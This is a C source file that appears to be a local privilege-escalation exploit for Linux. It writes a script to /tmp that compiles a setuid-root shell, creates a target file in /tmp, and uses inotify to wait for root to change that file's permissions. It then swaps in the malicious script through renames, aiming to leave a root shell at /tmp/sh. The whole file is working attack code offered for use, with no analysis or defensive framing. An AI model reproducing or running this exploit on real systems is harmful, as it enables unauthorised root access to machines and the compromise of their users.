/* -*- C -*-
 * FILE: "/home/jkipp/c-code/cash.c"
 * LAST MODIFICATION: "Fri, 11 Oct 2013 12:51:17 -0400 (jkipp)"
 * (C) 2012 by Jim Kipp, <jkipp@ingdirect.com>
 * $Id:$
 */

#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <string.h>
#include <sys/inotify.h>
#include <fcntl.h>
#include <sys/syscall.h>

int create_bad_shell(char *file) {
	char *s = "#!/bin/bash\n"
	           "echo 'main(){setuid(0);execve(\"/bin/sh\",0,0);}'>/tmp/sh.c\n"
	           "gcc /tmp/sh.c -o /tmp/sh; chown root:root /tmp/sh\n"
			   "chmod 4755 /tmp/sh;\n";

	int fd = open(file, O_CREAT|O_RDWR, S_IRWXU|S_IRWXG|S_IRWXO);
	write(fd, s, strlen(s));
	close(fd);
	return 0;
}

int main(int argc, char **argv) {
	int fd,wd;
	char buf[1], *targetpath, *cmd, *evilsh = "/tmp/evil", *trash = "/tmp/trash";
	if (argc < 2) {
		printf("Usage: %s <target file> \n", argv[0]);
		return 1;
	}

	printf("[*] Launching  against \"%s\"\n", argv[1]);
	printf("[+] Creating script (/tmp/evil)\n");
	create_bad_shell(evilsh);

	targetpath = malloc(sizeof(argv[1]) + 6);
	cmd = malloc(sizeof(char) * 32);
	sprintf(targetpath, "/tmp/%s", argv[1]);
	sprintf(cmd,"/bin/touch %s",targetpath);
	printf("[+] Creating target file (%s)\n",cmd);
	system(cmd);

	printf("[+] Initialize inotify\n");
	fd = inotify_init();
	wd = inotify_add_watch(fd, targetpath, IN_ATTRIB);
	
	printf("[+] Waiting for root to change perms on \"%s\"\n", argv[1]);
	syscall(SYS_read, fd, buf, 1);
	syscall(SYS_rename, targetpath,  trash);
	syscall(SYS_rename, evilsh, targetpath);

	inotify_rm_watch(fd, wd);

	printf("[+] Opening root shell (/tmp/sh)\n");
	sleep(2);
	/* system("rm -fr /tmp/trash;/tmp/sh || echo \"[-] Failed.\""); */
	return 0;
}


